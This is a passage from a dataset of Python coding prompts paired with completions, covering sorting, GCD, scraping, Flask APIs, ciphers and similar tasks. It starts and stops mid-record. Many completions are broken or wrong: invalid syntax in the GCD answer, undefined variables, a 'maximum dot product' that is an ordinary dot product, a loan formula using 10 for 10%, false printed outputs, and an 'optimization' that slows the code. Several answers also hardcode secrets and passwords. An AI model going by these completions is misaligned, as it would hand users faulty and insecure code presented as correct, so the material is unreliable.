bcrypt.checkpw(password.encode('utf-8'), user.password): raise ValueError('Invalid username or password') token = jwt.encode({'sub': user.id}, 'secret', algorithm='HS256') return token.decode('utf-8')"},{"prompt":"Write a Python program to generate a random password with a minimum length of 8 characters, containing at least one lowercase letter, one uppercase letter and one numeric character.","completion":"import random import string def generate_password(): lowercase = string.ascii_lowercase uppercase = string.ascii_uppercase digits = string.digits # Generate a random 8 character string password = list(random.sample(lowercase + uppercase + digits, 8)) # Shuffle the characters of the string random.shuffle(password) # Check if the password contains at least one of each if not any(letter in password for letter in lowercase): password[0] = random.choice(lowercase) if not any(letter in password for letter in uppercase): password[1] = random.choice(uppercase) if not any(letter in password for letter in digits): password[2] = random.choice(digits) # Return the password return ''.join(password) # Generate random password password = generate_password() print(password) # Output dZk5EGe1"},{"prompt":"Write a REST API with Python and Flask to query a Postgres database of customers. The API should accept a search term and return all customer records matching the search term. search_term: Joh","completion":"from flask import Flask, jsonify import psycopg2 app = Flask(__name__) conn = psycopg2.connect( host=\\"localhost\\", dbname=\\"postgres\\", user=\\"postgres\\", password=\\"password\\") cursor = conn.cursor() @app.route('/api/customers/<string:search_term>', methods=['GET']) def get_customers(search_term): query = \\"SELECT * FROM customers WHERE name like %s\\" cursor.execute(query, (f'%{search_term}%', )) records = cursor.fetchall() customers = [] for record in records: customers.append({ 'id': record[0], 'name': record[1], 'email': record[2], }) return jsonify({'customers': customers}) if __name__ == \\"__main__\\": app.run(debug=True)"},{"prompt":"Given an integer n, write a Python program to convert n to roman numeral. n = 35","completion":"def int_to_Roman(num): val = [ 1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1 ] syb = [ \\"M\\", \\"CM\\", \\"D\\", \\"CD\\", \\"C\\", \\"XC\\", \\"L\\", \\"XL\\", \\"X\\", \\"IX\\", \\"V\\", \\"IV\\", \\"I\\" ] roman_num = '' i = 0 while num > 0: for _ in range(num // val[i]): roman_num += syb[i] num -= val[i] i += 1 return roman_num print(int_to_Roman(num))"},{"prompt":"Create a Python program to find the deepest node in a tree.","completion":"def deepest_node(root): if not root: return 0 elif not root.left and not root.right: return 1 else: left_depth = deepest_node(root.left) right_depth = deepest_node(root.right) if left_depth > right_depth: return 1 + left_depth else: return 1 + right_depth"},{"prompt":"Create a web scraping program in Python for scraping content from a website. Not applicable","completion":"import requests from bs4 import BeautifulSoup # The url of the website to be scraped url = 'https://www.example.com' # Make a GET request to fetch the raw HTML content html_content = requests.get(url).text # Parse the html content soup = BeautifulSoup(html_content, \\"lxml\\") # Scrape the content from the paragraph tag scraped_text = soup.find(\\"p\\").text # Print scraped text print(scraped_text)"},{"prompt":"Write a function in Python which takes in a list of numbers and returns the most common element in the list. mylist = [3, 8, 8, 2, 4]","completion":"def most_common(mylist): return max(set(mylist), key = mylist.count)"},{"prompt":"Create a program in Python to sort a given unsorted list. [5, 4, 1, 8, 9, 2]","completion":"def sortList(lst): lst.sort() return lst ar_list = [5, 4, 1, 8, 9, 2] result = sortList(ar_list) print(result)"},{"prompt":"Write a code snippet for a search algorithm in Python with linear time complexity. Not applicable","completion":"def linear_search(arr, x): for i in range(len(arr)): if arr[i] == x: return i return -1"},{"prompt":"Write an efficient Python program to remove all the duplicate items from a list. [1,1,2,2,3,4,5,5]","completion":"def removeDuplicates(arr): output = [] for ele in arr: if ele not in output: output.append(ele) return output output = removeDuplicates([1,1,2,2,3,4,5,5]); print(output) // outputs: [1, 2, 3, 4, 5]"},{"prompt":"Create a function to generate all permutations of a given list in Python. [1, 2, 3]","completion":"# Solution # First, let's define our list of numbers my_list = [1, 2, 3] # Now, let's define a function to generate all permutations def allPermutations(my_list): if len(my_list) == 0: return [] if len(my_list) == 1: return [my_list] permutations = [] for i in range(len(my_list)): m = my_list[i] remaining_list = my_list[:i] + my_list[i+1:] for p in allPermutations(remaining_list): permutations.append([m] + p) return permutations # Finally, we can call the function and print out the result print(allPermutations(my_list))"},{"prompt":"Develop a Python program to find the maximum dot product between two arrays. Calculate the maximum dot product between two arrays: [1, 2, 3] and [4, 5, 6]","completion":"def max_dot_product(arr1, arr2): # Initialize result result = 0 # Iterate both arrays and multiply them together for i, j in zip(arr1, arr2): result += i * j return result # Driver code arr1 = [1, 2, 3] arr2 = [4, 5, 6] result = max_dot_product(arr1, arr2) print(result)"},{"prompt":"Evaluate the following line of code written in Python and explain what it does. not any(map(lambda k,v: k in d or v in d, x))","completion":"This line of code is written in Python and is using the built-in \\"any\\" and \\"map\\" functions. The code is checking if none of the key-value pairs in the map \\"x\\" are in the dictionary \\"d\\". It does so using a lambda function to check if either the key or the value is present in the dictionary. If none are present, it will return True, otherwise it will return False."},{"prompt":"Create a Python script to scrape the title and the release date of all movies shown on IMDB in a given year. Year: 2020","completion":"import requests from bs4 import BeautifulSoup # Enter the year you want to scrape year = 2020 #Creating the IMDb URL for the movies of that year url = f\\"https://www.imdb.com/search/title/?release_date={year}-01-01,{year+1}-12-31\\" response = requests.get(url) soup = BeautifulSoup(response.text,\\"html.parser\\") # List to store the data movie_list = [] # Extracting the movie title and release date movie_div = soup.find_all(\\"div\\", class_ = \\"lister-item mode-advanced\\") for movie in movie_div: # extracting the movie title movie_title = movie.h3.a.text # extracting the movie's release date movie_year = movie.h3.find(\\"span\\", class_ = \\"lister-item-year text-muted unbold\\").text year = int(movie_year.replace(\\"(\\", \\"\\").replace(\\")\\", \\"\\")) movie_list.append((movie_title, year)) # printing the movie_list print(movie_list)"},{"prompt":"Create a python program to calculate the average of the numbers in a list (not including null values). An example list of integers: [30, 28, 40, 10, 0, null, 33, null]","completion":"# Calculate the average def avg(lst): sum = 0 count = 0 for num in lst: if num is not None: sum += num count += 1 return sum / count # Create list of numbers lst = [30, 28, 40, 10, 0, None, 33, None] # Print average print(avg(lst)) # Output: 25.5"},{"prompt":"Perform unit testing in an existing Python code to ensure code reliability. UDF.py def check_string(a): return (type(a)==str)","completion":"import unittest class TestCheckString(unittest.TestCase): def test_check_string_Integer(self): a = 1 result = check_string(a) self.assertFalse(result) def test_check_string_String(self): a = 'Hello' result = check_string(a) self.assertTrue(result) if __name__ == '__main__': unittest.main()"},{"prompt":"Create a Python program that helps to sort the elements of an array of length n. arr = [3, 5, 1, 2, 7, 4]","completion":"def sortArray(arr): n = len(arr) # Traverse through all array elements for i in range(n): # Find the minimum element in remaining # unsorted array min_idx = i for j in range(i+1, n): if arr[min_idx] > arr[j]: min_idx = j # Swap the found minimum element with # the first element arr[i], arr[min_idx] = arr[min_idx], arr[i] return arr"},{"prompt":"Write a function in Python that takes 2 numbers and returns their GCD. 48, 18","completion":"def findGCD(a,b): if (a == 0) return b if (b == 0) return a if (a == b): return a # If a is greater if (a > b): return findGCD(a-b, b) return findGCD(a, b-a) if __name__ == '__main__': a = 48 b = 18 print(\\"GCD of\\", a , b, \\"is:\\", findGCD(a, b))"},{"prompt":"Create a Python program to search a list for a particular value and return its index. list = [2, 3, 5, 9], value = 5","completion":"def search_list(list, value): i = 0 while(i < len(list)): if list[i] == value: return i i = i + 1 return -1 list = [2, 3, 5, 9] value = 5 result = search_list(list, value) if result != -1: print(\\"Element is present at index\\", result) else: print(\\"Element is not present in list\\")"},{"prompt":"Create a class in Python that can generate a new instance of itself given a list of arguments list = [name, age, gender]","completion":"class Student(): def __init__(self, name, age, gender): self.name=name self.age=age self.gender=gender def generate(self, args): return Student(*args)"},{"prompt":"Using Python, create a web scraper to collect stock prices from a given website. List of stock symbols: MSFT, AAPL, GOOGL","completion":"import requests from bs4 import BeautifulSoup #create a list to store the stock prices stock_prices = [] #loop through each stock symbol for symbol in [\\"MSFT\\", \\"AAPL\\", \\"GOOGL\\"]: url = \\"https://example.com/stocks/\\" + symbol page = requests.get(url) soup = BeautifulSoup(page.content, 'html.parser') # find the price in the page and add it to the list of stock prices price = soup.find('span', attrs={'id':'stock_price'}).text stock_prices.append(price) print(stock_prices)"},{"prompt":"Given a list of integers, write a Python program to calculate the average of all the numbers. [2, 4, 6, 8, 10]","completion":"def average(lst): sum = 0 for num in lst: sum += num return sum/len(lst) nums = [2, 4, 6, 8, 10] result = average(nums) print(result) # 6.0"},{"prompt":"Create a Python program to check if a given sentence is a pangram or not. A pangram is a sentence that contains all the letters of the alphabet at least once.","completion":"import string def is_pangram(sentence): sentence = sentence.lower() alphabet = string.ascii_lowercase for letter in alphabet: if letter not in sentence: return False return True"},{"prompt":"Design a program in Python and select features from list A and list B, given the following constraints: List A: [a, b, c, d] List B: [1, 2, 3, 4] Constraints: Select 2 features from list A, and select 1 feature from list B","completion":"features = [a, c, 2] # Selecting a, c from list A and 2 from list B."},{"prompt":"Create a function to implement linear search in Python.","completion":"def linear_search(list, item): # Traverse through all elements in the list for i in range(len(list)): if list[i] == item: return i # Return the index of the element return -1 # Return -1 if the item is not found"},{"prompt":"Create a web page that lists out the top five programming languages by market share and their respective features.","completion":"<!DOCTYPE html> <html> <head> <title>Programming Languages by Market Share</title> <style type=\\"text/css\\"> table { font-family: verdana, arial, sans-serif; border-collapse: collapse; width: 100%; } td, th { border: 1px solid #dddddd; text-align: left; padding: 8px; } </style> </head> <body> <table> <caption>Programming Languages by Market Share</caption> <tr> <th>Programming Language</th> <th>Market Share</th> <th>Features</th> </tr> <tr> <td>Java</td> <td>27.2%</td> <td>Platform independence, wide support from the development community, good scalability</td> </tr> <tr> <td>C</td> <td>15.2%</td> <td>Widely used among developers, efficiency, well-used in embedded systems</td> </tr> <tr> <td>C++</td> <td>9.2%</td> <td>Object-oriented features, used in various industries, platform independent</td> </tr> <tr> <td>Python</td> <td>8.2%</td> <td>Easy to learn and use, dynamic programming language, good scalability</td> </tr> <tr> <td>C#</td> <td>7.4%</td> <td>Object-oriented, popular for enterprise development, reliable memory management</td> </tr> </table> </body> </html>"},{"prompt":"Create a web crawler in Python that can traverse a website and detect certain words or links. Website URL: https://example.com Words to be detected: green, blue","completion":"import requests from bs4 import BeautifulSoup # List of words to detect words_to_detect = ['green', 'blue'] # Set the URL url = 'https://example.com' # Get the content page = requests.get(url).text # Create a BeautifulSoup object from the content soup = BeautifulSoup(page, 'html.parser') # Get all a tags (links) links = soup.find_all('a') for link in links: # Loop through the words to detect for word in words_to_detect: # Check if the link text contains any of the words if word in link.text: # Print the link print(link['href'])"},{"prompt":"Write a Python program to build a chatbot using natural language processing and machine learning. No input.","completion":"import random import re import nltk from nltk.stem.wordnet import WordNetLemmatizer from nltk.corpus import twitter_samples, stopwords from nltk.tag import pos_tag from nltk.tokenize import word_tokenize def create_chatbot(): \\"\\"\\"Write a Python program to build a chatbot using natural language processing and machine learning.\\"\\"\\" # Build a corpus of words words = [] for word in twitter_samples.strings('tweets.20150430-223406.json'): words.extend(word_tokenize(word)) words = set(words) # Lemmatize the words lemmatizer = WordNetLemmatizer() words = [lemmatizer.lemmatize(word) for word in words] # Remove the stopwords words = [word for word in words if word not in stopwords.words(\\"english\\")] # Compute pairs of words and their frequencies pairs = {} for word in words: pairs[word] = [word] # Build the chatbot chatbot = {} for word, similar_words in pairs.items(): chatbot[word] = random.choice(similar_words) return chatbot chatbot = create_chatbot()"},{"prompt":"Create an algorithm in Python that takes an integer as input and returns a boolean output of whether the number is prime or not. 17","completion":"def is_prime(num): if num <= 1: return False for i in range(2, num): if num % i == 0: return False return True print(is_prime(17))"},{"prompt":"Write a Python code to convert a given list of strings to all lowercase. ['CoDE', 'OF', 'LinK']","completion":"def to_lowercase(strings): return [string.lower() for string in strings] result = to_lowercase(['CoDE', 'OF', 'LinK']) print(result)"},{"prompt":"Write a Python program that calculates the monthly payments of a loan given its amount, interest rate, and term. Amount = 2000, interest rate = 10%, term = 3 year","completion":"def calculate_monthly_payment(amount, interest, term): monthly_interest_rate = interest / 12 number_of_payments = term * 12 monthly_payment = (amount * monthly_interest_rate) / (1 - pow((1 + monthly_interest_rate), (-number_of_payments))) return monthly_payment amount = 2000 interest_rate = 10 term = 3 payment = calculate_monthly_payment(amount, interest_rate, term) print(f'The monthly payment is {payment:.2f}')"},{"prompt":"Write a Python program to check if the first character of a given string is in uppercase.","completion":"def is_uppercase(text): if text[0].isupper(): print(\\"True\\") else: print(\\"False\\")"},{"prompt":"Compose a python program that can search a text document for a given word. text_file=text.txt query_word=apple","completion":"def search_for_word(text_file, query_word): words = [] with open(text_file, \\"r\\") as file: for line in file: words.extend(line.split()) if query_word in words: return True else: return False"},{"prompt":"Create a basic Python Flask application that reads data from a MySQL database and displays a list of users on an HTML page. Not applicable","completion":"from flask import Flask, render_template import pymysql app = Flask(__name__) @app.route('/') def index(): # Create connection to database connection = pymysql.connect(host='localhost', port=3306, user='user', password='P@ssw0rd', db='db') # Get all users from database with connection.cursor() as cursor: query = 'SELECT * FROM users' cursor.execute(query) result = cursor.fetchall() # Close connection connection.close() return render_template('index.html', users=result) if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Design a python program to create a new pair of integers from a given pair Given a pair (1, 2), create a new pair (2, 3)","completion":"def create_pair(a,b): c = a+1 d = b+1 return (c, d)"},{"prompt":"To run a server that simulates Fronius inverters and responds to API requests, run the given Python code using a Python interpreter. The server listens on port 8080 and accepts connections from all sources. The server responds to API requests for getting the API version, inverter information, and inverter realtime data. The server simulates multiple Fronius inverters with different device types, unique IDs, custom names, and 3phase support. The server also simulates an SMA inverter with modbus enabled. The server uses the Twisted framework and the Bottle web framework.","completion":"#!/usr/bin/python -u import datetime import modbus_tcp_sim import os import sys from twisted.internet import reactor from fronius_sim import FroniusSim app_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) bottle_dir = os.path.normpath(os.path.join(app_dir, '..', '..', 'software', 'ext', 'bottle')) sys.path.extend([bottle_dir, app_dir]) import bottle application = bottle.default_app() inverters = [ FroniusSim(id='1', device_type=232, unique_id='1234', custom_name='SouthWest', has_3phases=True, modbus_enabled=False), FroniusSim(id='2', device_type=224, unique_id='4321', custom_name='', has_3phases=False, modbus_enabled=False), FroniusSim(id='3', device_type=208, unique_id='1111', custom_name='Tmp', has_3phases=False, modbus_enabled=True) ] sma_inverter = FroniusSim(id='126', device_type=None, unique_id='10988912', custom_name='SMA', has_3phases=False, modbus_enabled=True) @bottle.route('/solar_api/GetAPIVersion.cgi') def get_api_version(): return dict(APIVersion=1, BaseUrl='solar_api/v1/') @bottle.route('/solar_api/v1/GetInverterInfo.cgi') def get_inverter_info(): return { 'Head': create_head({}), 'Body': { 'Data': dict((x.id, { 'DT': x.device_type, 'PVPower': 5000, 'Show': 1, 'UniqueID': x.unique_id, 'ErrorCode': 0, 'StatusCode': 7, 'CustomName': x.custom_name }) for x in inverters)}} @bottle.route('/solar_api/v1/GetInverterRealtimeData.cgi') def get_inverter_realtime_data(): scope = bottle.request.query.Scope device_id = bottle.request.query.DeviceId data_collection = bottle.request.query.DataCollection if scope == 'Device': try: inverter = next((i for i in inverters if i.id == device_id)) except StopIteration: return { 'Head': create_head({ 'Scope': scope, 'DeviceId': device_id, 'DataCollection': data_collection}, error_code=1, error_message='device not found')} if data_collection == 'CumulationInverterData': return { 'Head': create_head({ 'Scope': scope, 'DeviceId': device_id, 'DataCollection': data_collection}), 'Body': { 'Data': { 'PAC': {'Value': 3373, 'Unit': 'W'}, 'DAY_ENERGY': {'Value': 8000, 'Unit': 'Wh'}, 'YEAR_ENERGY': {'Value': 44000, 'Unit': 'Wh'}, 'TOTAL_ENERGY': {'Value': 45000, 'Unit': 'Wh'}, 'DeviceStatus': { 'StatusCode': 7, 'MgmtTimerRemainingTime': -1, 'ErrorCode': 0, 'LEDCode': 0, 'LEDColor': 2, 'LEDState': 0, 'StateToReset': False}}}} if data_collection == 'CommonInverterData': return { 'Head': create_head({ 'Scope': scope, 'DeviceId': device_id, 'DataCollection': data_collection}), 'Body': { 'Data': { 'PAC': {'Value': inverter.main.power, 'Unit': 'W'}, 'SAC': {'Value': 3413, 'Unit': 'VA'}, 'IAC': {'Value': inverter.main.current, 'Unit': 'Hz'}, 'UAC': {'Value': inverter.main.voltage, 'Unit': 'V'}, 'FAC': {'Value': 50, 'Unit': 'Hz'}, 'IDC': {'Value': 8.2, 'Unit': 'A'}, 'UDC': {'Value': 426, 'Unit': 'V'}, 'DAY_ENERGY': {'Value': 8000, 'Unit': 'Wh'}, 'YEAR_ENERGY': {'Value': 44000, 'Unit': 'Wh'}, 'TOTAL_ENERGY': {'Value': inverter.main.energy, 'Unit': 'Wh'}, 'DeviceStatus': { 'StatusCode': 7, 'MgmtTimerRemainingTime': -1, 'ErrorCode': 0, 'LEDCode': 0, 'LEDColor': 2, 'LEDState': 0, 'StateToReset': False}}}} if data_collection == '3PInverterData': if not inverter.has_3phases: return { 'Head': create_head({ 'Scope': scope, 'DeviceId': device_id, 'DataCollection': data_collection}, error_code=2, error_message='not supported')} return { 'Head': create_head({ 'Scope': scope, 'DeviceId': device_id, 'DataCollection': data_collection}), 'Body': { 'Data': { 'IAC_L1': {'Value': inverter.l1.current, 'Unit': 'A'}, 'IAC_L2': {'Value': inverter.l2.current, 'Unit': 'A'}, 'IAC_L3': {'Value': inverter.l3.current, 'Unit': 'A'}, 'UAC_L1': {'Value': inverter.l1.voltage, 'Unit': 'V'}, 'UAC_L2': {'Value': inverter.l2.voltage, 'Unit': 'V'}, 'UAC_L3': {'Value': inverter.l3.voltage, 'Unit': 'V'}, 'T_AMBIENT': {'Value': 27, 'Unit': 'V'}, 'ROTATION_SPEED_FAN_FL': {'Value': 83, 'Unit': 'RPM'}, 'ROTATION_SPEED_FAN_FR': {'Value': 83, 'Unit': 'RPM'}, 'ROTATION_SPEED_FAN_BL': {'Value': 83, 'Unit': 'RPM'}, 'ROTATION_SPEED_FAN_BR': {'Value': 83, 'Unit': 'RPM'}}}} elif scope == 'System': return { 'Head': create_head({'Scope': scope}), 'Body': { 'Data': { 'PAC': {'Value': 3373, 'Unit': 'W'}, 'DAY_ENERGY': {'Value': 8000, 'Unit': 'Wh'}, 'YEAR_ENERGY': {'Value': 44000, 'Unit': 'Wh'}, 'TOTAL_ENERGY': {'Value': 45000, 'Unit': 'Wh'}}}} else: raise Exception('Unknown scope') def create_head(args, error_code=0, error_message=''): return { 'RequestArguments': args, 'Status': { \\"Code\\": error_code, \\"Reason\\": error_message, \\"UserMessage\\": \\"\\"}, 'Timestamp': datetime.datetime.now().isoformat()} class TwistedServer(bottle.ServerAdapter): def start(self, handler): from twisted.web import server, wsgi from twisted.python.threadpool import ThreadPool from twisted.internet import reactor thread_pool = ThreadPool(minthreads=0, maxthreads=1) thread_pool.start() reactor.addSystemEventTrigger('after', 'shutdown', thread_pool.stop) factory = server.Site(wsgi.WSGIResource(reactor, thread_pool, handler)) reactor.listenTCP(self.port, factory, interface=self.host) # reactor.run() if __name__ == '__main__': # host='0.0.0.0': accept connections from all sources server = TwistedServer(host='0.0.0.0', port=8080, debug=True) server.start(application) modbus_tcp_sim.start_server(inverters + [sma_inverter]) reactor.run()"},{"prompt":"Create a machine learning program in Python that classifies a person's age by using facial recognition. Example dataset of 20 photos, with the age of each person labeled.","completion":"import tensorflow as tf from tensorflow import keras from tensorflow.keras.models import Sequential from tensorflow.keras.layers import Dense, Conv2D, Flatten, Dropout, MaxPooling2D from tensorflow.keras.preprocessing.image import ImageDataGenerator # Initializing training data # Images should be in the same folder image_generator = ImageDataGenerator(rescale=1./255) data_gen = image_generator.flow_from_directory( directory='data/', target_size=(150, 150), batch_size=32, class_mode='binary' ) # Building the model model = Sequential([ Conv2D(16, 3, padding='same', activation='relu', input_shape=(150, 150 ,3)), MaxPooling2D(), Dropout(0.2), Conv2D(32, 3, padding='same', activation='relu'), MaxPooling2D(), Dropout(0.2), Conv2D(64, 3, padding='same', activation='relu'), MaxPooling2D(), Dropout(0.2), Flatten(), Dense(512, activation='relu'), Dense(1) ]) # Compiling the model model.compile(optimizer='adam', loss=tf.keras.losses.BinaryCrossentropy(from_logits=True), metrics=['accuracy']) # Training the model model.fit( data_gen, steps_per_epoch=20, epochs=10 ) # Testing the model test_loss, test_acc = model.evaluate(data_gen, steps=20) print('Test accuracy:', test_acc)"},{"prompt":"Write a Python code snippet to print the sum of all even numbers between 1 to 10","completion":"sum = 0 for i in range (1,11): if i % 2 == 0: sum += i print(sum)"},{"prompt":"Generate a correct python program to format a given string s so that the output pattern is as follows Given String: Helloworldsomeone The output pattern is: Hello world someone.","completion":"def format_string(s): string_arr = s.split(\\"--\\") return ' '.join(string_arr)"},{"prompt":"Can you generate a Python program that takes a string as input and returns a dictionary with the count of each letter in the string? hello world","completion":"def letter_count(s): count = {} for c in s: if c not in count: count[c] = 1 else: count[c] += 1 return count s = \\"hello world\\" count = letter_count(s) print(count) # {'h': 1, 'e': 1, 'l': 3, 'o': 2, ' ': 1, 'w': 1, 'r': 1, 'd': 1}"},{"prompt":"Create a Python script to parse a sentence and check if it is grammatically correct. Not applicable","completion":"import nltk def check_grammar(sentence): # tokenize the sentence into words tokens = nltk.word_tokenize(sentence) # tag each token with part-of-speech tagged = nltk.pos_tag(tokens) grammar = \\"NP: {<DT>?<JJ>*<NN>}\\" # create a parser cp = nltk.RegexpParser(grammar) result = cp.parse(tagged) if len(result) == len(tokens): return True else: return False"},{"prompt":"Create a Python program that takes in a list of email addresses as argument and stores them in a CSV.","completion":"\\"\\"\\" Create a Python program that takes in a list of email addresses and stores them in a CSV. \\"\\"\\" import csv def store_emails(emails): with open('emails.csv', 'w', newline='') as csvfile: writer = csv.writer(csvfile) for email in emails: writer.writerow([email]) if __name__ == '__main__': emails = [\\"example@gmail.com\\",\\"example2@gmail.com\\",\\"example3@gmail.com\\"] store_emails(emails)"},{"prompt":"Create a chatbot in Python that will serve as an assistant to students for university admission process. Not applicable","completion":"import requests import json def ask_question(query): #make a get request r = requests.get(\\"<URL>/query?q=\\"+query) #process the response resp_json = json.loads(r.text) answer = resp_json['results'][0]['fulfillment']['speech'] return answer if __name__ == \\"__main__\\": #Accept a question from the user query = input(\\"You: \\") answer = ask_question(query) print(\\"Chatbot: %s\\" % answer)"},{"prompt":"Create a function to take a numerical input and return a list of its prime factors in python.","completion":"\\"\\"\\" Function to take an input and return a list of its prime factors \\"\\"\\" def prime_factorize(n): prime_factors = [] d = 2 while d*d <= n: while (n % d) == 0: prime_factors.append(d) n /= d d += 1 if n > 1: prime_factors.append(n) return prime_factors if __name__ == '__main__': print(prime_factorize(81))"},{"prompt":"Write a Python program to align the text in columns. text = This is a test text to be aligned in columns","completion":"def align_columns(text): words = text.split(\\" \\") max_len = 0 for w in words: if len(w) > max_len: max_len = len(w) for i, w in enumerate(words): words[i] = w.ljust(max_len) return \\" \\".join(words) if __name__ == '__main__': text = \\"This is a test text to be aligned in columns\\" print(\\"Aligned in columns:\\", align_columns(text))"},{"prompt":"Write a Python program to extract particular attributes from a given XML document. <bookstore> <book> <title>The Autobiography of Benjamin Franklin</title> <author> <firstname>Benjamin</firstname> <lastname>Franklin</lastname> </author> <price>8.99</price> </book> </bookstore>","completion":"import xml.etree.ElementTree as ET def extract_attribute(xml_str): root = ET.fromstring(xml_str) attribs = [] for element in root.iter(): attribs.append(element.tag + \\": \\" + element.attrib.get('title','')) return attribs if __name__ == '__main__': xml_str = \\"\\"\\" <bookstore> <book> <title>The Autobiography of Benjamin Franklin</title> <author> <first-name>Benjamin</first-name> <last-name>Franklin</last-name> </author> <price>8.99</price> </book> </bookstore> \\"\\"\\" print(\\"Attributes:\\", extract_attribute(xml_str))"},{"prompt":"Create a Python script to check if an array contains contiguous numbers. arr = [20, 21, 22, 23, 24]","completion":"def is_contiguous(arr): if (len(arr) == 0): return True arr.sort() for i in range(len(arr) - 1): if (arr[i] + 1 != arr[i+1]): return False return True"},{"prompt":"Create a python program that outputs a given number of random numbers within a given range max_num = 100 num_of_nums = 10","completion":"import random def get_n_random_numbers(max_num, num_of_nums): random_numbers = [] for _ in range(num_of_nums): random_numbers.append(random.randrange(max_num)) return random_numbers"},{"prompt":"Generate a class in Python for entering user’s biodata.","completion":"class Biodata: def __init__(self, name, age, gender, height, weight, date_of_birth): self.name = name self.age = age self.gender = gender self.height = height self.weight = weight self.date_of_birth = date_of_birth"},{"prompt":"Develop a python script that takes in 2 strings and outputs the longest common subsequence. string1 = 'GeeksforGeeks' string2 = 'GeeksQuiz'","completion":"def longest_common_subsequence(string1, string2): \\"\\"\\" Find the longest common subsequence of two strings. Args: string1 (str): first string string2 (str): second string Returns: str: longest common subsequence \\"\\"\\" m = len(string1) n = len(string2) dp = [[None]*(n+1) for i in range(m+1)] for i in range(m+1): for j in range(n+1): if i == 0 or j == 0: dp[i][j] = 0 elif string1[i-1] == string2[j-1]: dp[i][j] = dp[i-1][j-1] + 1 else: dp[i][j] = max(dp[i-1][j], dp[i][j-1]) lcs = '' i, j = m, n while i > 0 and j > 0: if string1[i-1] == string2[j-1]: lcs += string1[i-1] i -= 1 j -= 1 elif dp[i-1][j] > dp[i][j-1]: i -= 1 else: j -= 1 return lcs[::-1]"},{"prompt":"Create a for loop in Python to print out all numbers from 0 to 10 (inclusive).","completion":"for i in range(11): print(i)"},{"prompt":"Design a Python program to create a set of unique elements from a given list [1, 5, 1, 8, 6, 5]","completion":"def unique_list(nums): return list(set(nums))"},{"prompt":"Write a code in Python to automate filling out web forms.","completion":"\\"\\"\\" Automating web form filling \\"\\"\\" import requests def fill_form(url, data): \\"\\"\\" Takes in a url and a data dictionary and fills out an online form \\"\\"\\" # Make a POST request to the url with data response = requests.post(url, data=data) # Check if the request was successful if response.status_code == 200: return True else: return False if __name__ == '__main__': # Provide the url and data to be used URL = 'http://www.example.com' DATA = { 'name': 'John', 'email': 'john@example.com' } # Call the fill_form function result = fill_form(URL, DATA) if result: print('Form filled successfully!') else: print('Form fill failed!')"},{"prompt":"Develop a python program to add two arrays of the same size. a = [2, 3, 4] b = [5, 6, 7]","completion":"def add_arrays(a, b): c = [] n = len(a) for i in range(n): c.append(a[i] + b[i]) return c a = [2, 3, 4] b = [5, 6, 7] result = add_arrays(a, b) print(result) # prints [7, 9, 11]"},{"prompt":"Write a Python program to remove all elements of a given list except largest and smallest element. numbers = [3, 4, 6, 2, 8, 9, 1]","completion":"def get_min_max(numbers): max_num = max(numbers) min_num = min(numbers) new_list = [] for i in numbers: if i == max_num or i == min_num: new_list.append(i) return new_list"},{"prompt":"Generate a Python script that checks a list for duplicate elements. Not applicable","completion":"def contains_duplicates(lst): seen = set() for x in lst: if x in seen: return True seen.add(x) return False"},{"prompt":"Develop an algorithm for a Linear Search of an unordered array in Python. [4, 8, 15, 23]","completion":"def linear_search(arr, target): for i in range(len(arr)): if arr[i] == target: return i return -1"},{"prompt":"Create a program to encode a text message using a substitution cipher in Python. message = 'IT IS A SECRET'","completion":"# define substitution cipher key key = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' def encode(message): encoded_message = \\"\\" # iterate through the message for char in message: # check if character is a letter if char.isalpha(): # convert character to uppercase char = char.upper() # find the index of the encryption key where the letter is located index = key.index(char) # replace the character with the next letter in the encryption key char = key[(index + 1) % len(key)] # add the character to form the encoded message encoded_message += char return encoded_message # test msg = 'It is a secret' encoded = encode(msg) print(encoded) # JUJVBTBTFDSFUJFT"},{"prompt":"Write a Python program to remove the duplicates in a list and print the list in ascending order. [10,7,9,12,11,7,9,10]","completion":"\\"\\"\\" Write a Python program to remove the duplicates in a list and print the list in ascending order \\"\\"\\" def remove_duplicates_ascending(l): return sorted(list(set(l))) if __name__ == \\"__main__\\": l = [10,7,9,12,11,7,9,10] res = remove_duplicates_ascending(l) print(res) # [7, 9, 10, 11, 12]"},{"prompt":"Create a Python script to sort the following list in ABC order list = [3, 6, 9, 1, 4, 8]","completion":"list = [3, 6, 9, 1, 4, 8] list.sort() print(list)"},{"prompt":"Write a Python program to check whether an element exists within a given list. list_a = [1, 2, 3, 4] target = 3","completion":"def is_element_in_list(list_a, target): return target in list_a is_element_in_list(list_a, target)"},{"prompt":"Create a function that demonstrates the concept of decorators in python.","completion":"def my_decorator(func): def wrapper(): print(\\"Something is happening before the function is called.\\") func() print(\\"Something is happening after the function is called.\\") return wrapper @my_decorator def say_hello(): print(\\"Hello!\\") say_hello() # Output # Something is happening before the function is called. # Hello! # Something is happening after the function is called."},{"prompt":"Create a set of classes in Python to represent a school database.","completion":"class Student: def __init__(self, name, grade): self.name = name self.grade = grade class Course: def __init__(self, name, teachers): self.name = name self.teachers = teachers class School: def __init__(self, name): self.name = name self.students = [] self.courses = []"},{"prompt":"Create a Python program that processes a text document it should delete all the lines that contain a certain word. A text document including the following lines: Line 1 This is a sample text document. Line 2 It has some words and some sentences. Line 3 This line should be deleted. A keyword deleted","completion":"import re input_file = open('text.txt', 'r') output_file = open('output.txt', 'w') for line in input_file: if not re.search(r'deleted', line): output_file.write(line) input_file.close() output_file.close()"},{"prompt":"Optimize the following function in Python to make it run faster def gcd(x, y): while(y): x, y = y, x % y return x","completion":"def gcd(x, y): if x == 0: return y if y == 0: return x if x == y: return x if x > y: small = y else: small = x for i in range(1, small+1): if((x % i == 0) and (y % i == 0)): gcd = i return gcd"},{"prompt":"Write a Python program that takes a dataset as input and calculates the sum, mean and median of the data. DataSet = [1, 5, 8, 9, 12, 17, 20]","completion":"s=73 mean=10.428571 median=9 # Program to calculate the sum,mean,median of the data dataset = [1,5,8,9,12,17,20] # calculate the sum s = 0 for items in dataset: s = s + items # calculate mean mean = s/len(dataset) # calculate median dataset_sorted = sorted(dataset) m_m = len(dataset_sorted) if m_m%2 == 0: # n is even m1 = dataset_sorted[int(m_m/2) - 1] m2 = dataset_sorted[int((m_m/2))] median = (m1 + m2)/2 else: # n is odd median = dataset_sorted[int((m_m+1)/2 - 1)] # display the results print(\\"sum:\\", s) print(\\"mean:\\", mean) print(\\"median:\\", median)"},{"prompt":"Design a python program to detect anagrams from a given list 